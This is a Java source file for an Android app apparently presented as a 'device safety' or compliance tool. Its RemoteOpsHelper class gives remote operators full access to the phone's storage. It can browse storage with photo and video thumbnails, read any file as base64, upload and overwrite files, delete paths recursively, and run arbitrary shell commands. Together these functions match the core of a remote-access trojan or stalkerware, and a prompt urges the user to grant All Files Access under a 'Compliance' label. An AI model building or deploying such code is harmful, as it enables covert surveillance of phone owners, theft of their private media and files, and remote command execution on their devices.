package com.orphen.devicesafety;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaMetadataRetriever;
import android.media.ThumbnailUtils;
import android.os.Build;
import android.os.Environment;
import android.webkit.MimeTypeMap;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public final class RemoteOpsHelper {
    private static final long MAX_FILE_BYTES = 25L * 1024L * 1024L;
    private static final int SHELL_TIMEOUT_MS = 45000;
    private static final int MAX_THUMBS_PER_LIST = 48;
    private static final int THUMB_SIZE_PX = 240;
    private static final Set<String> IMAGE_EXTENSIONS = new HashSet<String>(Arrays.asList(
            "jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif"
    ));
    private static final Set<String> VIDEO_EXTENSIONS = new HashSet<String>(Arrays.asList(
            "mp4", "mov", "mkv", "avi", "3gp", "webm", "m4v", "mpeg", "mpg"
    ));

    private RemoteOpsHelper() {
    }

    public static String defaultRootPath() {
        File external = Environment.getExternalStorageDirectory();
        if (external != null) {
            return external.getAbsolutePath();
        }
        return "/storage/emulated/0";
    }

    public static JSONObject listDirectory(Context context, String path, boolean withThumbnails) throws Exception {
        requireStorageAccess(context);
        File directory = resolveFile(path);
        if (directory == null || !directory.exists()) {
            throw new Exception("Path not found: " + path);
        }
        if (!directory.isDirectory()) {
            throw new Exception("Not a directory: " + path);
        }
        File[] files = directory.listFiles();
        JSONArray entries = new JSONArray();
        int thumbCount = 0;
        if (path != null && path.length() > 0 && !isRootPath(path)) {
            File parent = directory.getParentFile();
            if (parent != null) {
                entries.put(buildEntry(context, "..", parent, true, true, withThumbnails, thumbCount));
            }
        }
        if (files != null) {
            Arrays.sort(files, new Comparator<File>() {
                @Override
                public int compare(File left, File right) {
                    if (left.isDirectory() != right.isDirectory()) {
                        return left.isDirectory() ? -1 : 1;
                    }
                    return left.getName().compareToIgnoreCase(right.getName());
                }
            });
            for (File file : files) {
                boolean wantsThumb = withThumbnails && !file.isDirectory() && isMediaFile(file.getName())
                        && thumbCount < MAX_THUMBS_PER_LIST;
                JSONObject entry = buildEntry(context, file.getName(), file, file.isDirectory(), false, wantsThumb, thumbCount);
                if (wantsThumb && entry.has("thumbnail")) {
                    thumbCount++;
                }
                entries.put(entry);
            }
        }
        JSONObject result = new JSONObject();
        result.put("path", directory.getAbsolutePath());
        result.put("entries", entries);
        return result;
    }

    public static JSONObject readFile(Context context, String path) throws Exception {
        requireStorageAccess(context);
        File file = resolveFile(path);
        if (file == null || !file.exists()) {
            throw new Exception("File not found: " + path);
        }
        if (file.isDirectory()) {
            throw new Exception("Path is a directory: " + path);
        }
        long length = file.length();
        if (length > MAX_FILE_BYTES) {
            throw new Exception("File exceeds 25 MB limit");
        }
        byte[] data = readAllBytes(file);
        JSONObject result = new JSONObject();
        result.put("path", file.getAbsolutePath());
        result.put("size", data.length);
        result.put("mimeType", guessMimeType(file.getName()));
        result.put("data", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP));
        return result;
    }

    public static JSONObject writeFile(Context context, String destPath, byte[] data) throws Exception {
        requireStorageAccess(context);
        if (data == null) {
            throw new Exception("Upload data missing");
        }
        if (data.length > MAX_FILE_BYTES) {
            throw new Exception("Upload exceeds 25 MB limit");
        }
        File file = resolveFile(destPath);
        if (file == null) {
            throw new Exception("Invalid destination path");
        }
        File parent = file.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            throw new Exception("Could not create parent directories");
        }
        FileOutputStream outputStream = new FileOutputStream(file);
        try {
            outputStream.write(data);
        } finally {
            outputStream.close();
        }
        JSONObject result = new JSONObject();
        result.put("path", file.getAbsolutePath());
        result.put("size", data.length);
        return result;
    }

    public static JSONObject performFileAction(Context context, String action, JSONArray paths, String destPath)
            throws Exception {
        requireStorageAccess(context);
        if (paths == null || paths.length() == 0) {
            throw new Exception("No paths selected");
        }
        String normalizedAction = action == null ? "" : action.trim().toLowerCase(Locale.US);
        JSONArray results = new JSONArray();
        int successCount = 0;
        if ("delete".equals(normalizedAction)) {
            for (int index = 0; index < paths.length(); index++) {
                String path = paths.optString(index, "").trim();
                JSONObject item = deletePath(path);
                results.put(item);
                if (item.optBoolean("ok", false)) {
                    successCount++;
                }
            }
        } else if ("copy".equals(normalizedAction) || "move".equals(normalizedAction)) {
            File destinationDir = resolveFile(destPath);
            if (destinationDir == null || !destinationDir.exists() || !destinationDir.isDirectory()) {
                throw new Exception("Destination folder not found: " + destPath);
            }
            for (int index = 0; index < paths.length(); index++) {
                String path = paths.optString(index, "").trim();
                JSONObject item = "move".equals(normalizedAction)
                        ? movePath(resolveFile(path), new File(destinationDir, new File(path).getName()))
                        : copyPath(resolveFile(path), new File(destinationDir, new File(path).getName()));
                results.put(item);
                if (item.optBoolean("ok", false)) {
                    successCount++;
                }
            }
        } else {
            throw new Exception("Unknown file action: " + action);
        }
        JSONObject result = new JSONObject();
        result.put("action", normalizedAction);
        result.put("successCount", successCount);
        result.put("totalCount", paths.length());
        result.put("results", results);
        result.put("ok", successCount == paths.length());
        return result;
    }

    public static JSONObject executeShell(Context context, String command) throws Exception {
        String trimmed = command == null ? "" : command.trim();
        if (trimmed.length() == 0) {
            throw new Exception("Empty command");
        }
        File workDir = resolveShellWorkingDirectory(context);
        ProcessBuilder builder = new ProcessBuilder("/system/bin/sh", "-c", trimmed);
        builder.directory(workDir);
        builder.redirectErrorStream(false);
        java.util.Map<String, String> env = builder.environment();
        env.put("PATH", "/system/bin:/system/xbin:/vendor/bin:/product/bin");
        env.put("HOME", workDir.getAbsolutePath());
        env.put("PWD", workDir.getAbsolutePath());
        Process process = builder.start();
        StringBuilder stdout = new StringBuilder();
        StringBuilder stderr = new StringBuilder();
        Thread outThread = streamToBuilder(process.getInputStream(), stdout);
        Thread errThread = streamToBuilder(process.getErrorStream(), stderr);
        outThread.start();
        errThread.start();
        boolean finished = process.waitFor(SHELL_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);
        outThread.join(1000L);
        errThread.join(1000L);
        if (!finished) {
            process.destroyForcibly();
            throw new Exception("Command timed out after 45 seconds");
        }
        JSONObject result = new JSONObject();
        result.put("command", trimmed);
        result.put("cwd", workDir.getAbsolutePath());
        result.put("stdout", stdout.toString());
        result.put("stderr", stderr.toString());
        result.put("exitCode", process.exitValue());
        result.put("ok", process.exitValue() == 0);
        return result;
    }

    private static File resolveShellWorkingDirectory(Context context) {
        if (context != null && StorageHelper.hasStorageAccess(context)) {
            File external = Environment.getExternalStorageDirectory();
            if (external != null && external.exists()) {
                return external;
            }
        }
        if (context != null) {
            return context.getFilesDir();
        }
        return new File(defaultRootPath());
    }

    private static JSONObject deletePath(String path) throws Exception {
        File file = resolveFile(path);
        JSONObject item = new JSONObject();
        item.put("path", path);
        if (file == null || !file.exists()) {
            item.put("ok", false);
            item.put("error", "Not found");
            return item;
        }
        boolean deleted = deleteRecursive(file);
        item.put("ok", deleted);
        if (!deleted) {
            item.put("error", "Delete failed");
        }
        return item;
    }

    private static boolean deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (!deleteRecursive(child)) {
                        return false;
                    }
                }
            }
        }
        return file.delete();
    }

    private static JSONObject copyPath(File source, File destination) throws Exception {
        JSONObject item = new JSONObject();
        item.put("source", source.getAbsolutePath());
        item.put("destination", destination.getAbsolutePath());
        if (!source.exists()) {
            item.put("ok", false);
            item.put("error", "Source not found");
            return item;
        }
        if (destination.exists()) {
            item.put("ok", false);
            item.put("error", "Destination already exists");
            return item;
        }
        if (source.isDirectory()) {
            if (!copyDirectory(source, destination)) {
                item.put("ok", false);
                item.put("error", "Folder copy failed");
                return item;
            }
        } else {
            File parent = destination.getParentFile();
            if (parent != null && !parent.exists() && !parent.mkdirs()) {
                item.put("ok", false);
                item.put("error", "Could not create destination folder");
                return item;
            }
            copyFile(source, destination);
        }
        item.put("ok", true);
        return item;
    }

    private static JSONObject movePath(File source, File destination) throws Exception {
        JSONObject copyResult = copyPath(source, destination);
        if (!copyResult.optBoolean("ok", false)) {
            return copyResult;
        }
        if (!deleteRecursive(source)) {
            copyResult.put("ok", false);
            copyResult.put("error", "Copied but source delete failed");
        }
        return copyResult;
    }

    private static boolean copyDirectory(File source, File destination) throws Exception {
        if (!destination.mkdirs()) {
            return false;
        }
        File[] children = source.listFiles();
        if (children == null) {
            return true;
        }
        for (File child : children) {
            File target = new File(destination, child.getName());
            if (child.isDirectory()) {
                if (!copyDirectory(child, target)) {
                    return false;
                }
            } else {
                copyFile(child, target);
            }
        }
        return true;
    }

    private static void copyFile(File source, File destination) throws Exception {
        FileInputStream inputStream = new FileInputStream(source);
        try {
            FileOutputStream outputStream = new FileOutputStream(destination);
            try {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, read);
                }
            } finally {
                outputStream.close();
            }
        } finally {
            inputStream.close();
        }
    }

    private static JSONObject buildEntry(
            Context context,
            String name,
            File file,
            boolean isDirectory,
            boolean isParent,
            boolean includeThumbnail,
            int thumbCount
    ) throws Exception {
        JSONObject entry = new JSONObject();
        entry.put("name", name);
        entry.put("path", file.getAbsolutePath());
        entry.put("isDir", isDirectory);
        entry.put("isParent", isParent);
        entry.put("size", isDirectory ? 0 : file.length());
        entry.put("modifiedAt", file.lastModified() / 1000L);
        entry.put("readable", file.canRead());
        entry.put("writable", file.canWrite());
        entry.put("mimeType", isDirectory ? "inode/directory" : guessMimeType(file.getName()));
        String mediaType = isDirectory ? "folder" : classifyMediaType(file.getName());
        entry.put("mediaType", mediaType);
        if (includeThumbnail && !isDirectory && !isParent && thumbCount < MAX_THUMBS_PER_LIST) {
            String thumbnail = generateThumbnailBase64(file, mediaType);
            if (thumbnail != null && thumbnail.length() > 0) {
                entry.put("thumbnail", thumbnail);
                entry.put("thumbnailMime", "image/jpeg");
            }
        }
        return entry;
    }

    private static String classifyMediaType(String filename) {
        String extension = extensionOf(filename);
        if (IMAGE_EXTENSIONS.contains(extension)) {
            return "image";
        }
        if (VIDEO_EXTENSIONS.contains(extension)) {
            return "video";
        }
        return "file";
    }

    private static boolean isMediaFile(String filename) {
        String type = classifyMediaType(filename);
        return "image".equals(type) || "video".equals(type);
    }

    private static String extensionOf(String filename) {
        if (filename == null) {
            return "";
        }
        int dot = filename.lastIndexOf('.');
        if (dot < 0 || dot == filename.length() - 1) {
            return "";
        }
        return filename.substring(dot + 1).toLowerCase(Locale.US);
    }

    private static String generateThumbnailBase64(File file, String mediaType) {
        Bitmap bitmap = null;
        try {
            if ("image".equals(mediaType)) {
                bitmap = decodeImageThumbnail(file);
            } else if ("video".equals(mediaType)) {
                bitmap = decodeVideoThumbnail(file);
            }
            if (bitmap == null) {
                return null;
            }
            Bitmap scaled = Bitmap.createScaledBitmap(bitmap, THUMB_SIZE_PX, THUMB_SIZE_PX, true);
            if (scaled != bitmap) {
                bitmap.recycle();
                bitmap = scaled;
            }
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 72, outputStream);
            byte[] bytes = outputStream.toByteArray();
            if (bytes.length > 120000) {
                return null;
            }
            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
        } catch (Exception ignored) {
            return null;
        } finally {
            if (bitmap != null) {
                bitmap.recycle();
            }
        }
    }

    private static Bitmap decodeImageThumbnail(File file) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                return ThumbnailUtils.createImageThumbnail(file, new android.util.Size(THUMB_SIZE_PX, THUMB_SIZE_PX), null);
            }
        } catch (Exception ignored) {
        }
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(file.getAbsolutePath(), options);
        options.inSampleSize = calculateInSampleSize(options, THUMB_SIZE_PX, THUMB_SIZE_PX);
        options.inJustDecodeBounds = false;
        return BitmapFactory.decodeFile(file.getAbsolutePath(), options);
    }

    private static Bitmap decodeVideoThumbnail(File file) {
        MediaMetadataRetriever retriever = new MediaMetadataRetriever();
        try {
            retriever.setDataSource(file.getAbsolutePath());
            Bitmap frame = retriever.getFrameAtTime(0, MediaMetadataRetriever.OPTION_CLOSEST_SYNC);
            if (frame != null) {
                return frame;
            }
        } catch (Exception ignored) {
        } finally {
            try {
                retriever.release();
            } catch (Exception ignored) {
            }
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                return ThumbnailUtils.createVideoThumbnail(file, new android.util.Size(THUMB_SIZE_PX, THUMB_SIZE_PX), null);
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static int calculateInSampleSize(BitmapFactory.Options options, int reqWidth, int reqHeight) {
        int height = options.outHeight;
        int width = options.outWidth;
        int inSampleSize = 1;
        if (height > reqHeight || width > reqWidth) {
            int halfHeight = height / 2;
            int halfWidth = width / 2;
            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2;
            }
        }
        return Math.max(1, inSampleSize);
    }

    private static Thread streamToBuilder(final InputStream inputStream, final StringBuilder builder) {
        return new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (builder.length() > 0) {
                            builder.append('\n');
                        }
                        builder.append(line);
                    }
                    reader.close();
                } catch (Exception ignored) {
                }
            }
        });
    }

    private static void requireStorageAccess(Context context) throws Exception {
        if (context != null && StorageHelper.hasStorageAccess(context)) {
            return;
        }
        throw new Exception("Storage permission missing. Open app → Compliance → Enable All Files Access.");
    }

    private static File resolveFile(String path) {
        String normalized = normalizePath(path);
        if (normalized.length() == 0) {
            normalized = defaultRootPath();
        }
        return new File(normalized);
    }

    private static String normalizePath(String path) {
        String value = path == null ? "" : path.trim();
        if (value.length() == 0) {
            return defaultRootPath();
        }
        value = value.replace("\\", "/");
        while (value.contains("//")) {
            value = value.replace("//", "/");
        }
        if (value.endsWith("/") && value.length() > 1) {
            value = value.substring(0, value.length() - 1);
        }
        return value;
    }

    private static boolean isRootPath(String path) {
        String normalized = normalizePath(path);
        String root = defaultRootPath();
        return normalized.equals(root) || normalized.equals("/") || normalized.equals("/storage/emulated/0");
    }

    private static byte[] readAllBytes(File file) throws Exception {
        FileInputStream inputStream = new FileInputStream(file);
        try {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] chunk = new byte[8192];
            int read;
            while ((read = inputStream.read(chunk)) != -1) {
                buffer.write(chunk, 0, read);
            }
            return buffer.toByteArray();
        } finally {
            inputStream.close();
        }
    }

    private static String guessMimeType(String filename) {
        String extension = extensionOf(filename);
        if (extension.length() > 0) {
            String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
            if (mime != null) {
                return mime;
            }
        }
        return "application/octet-stream";
    }
}
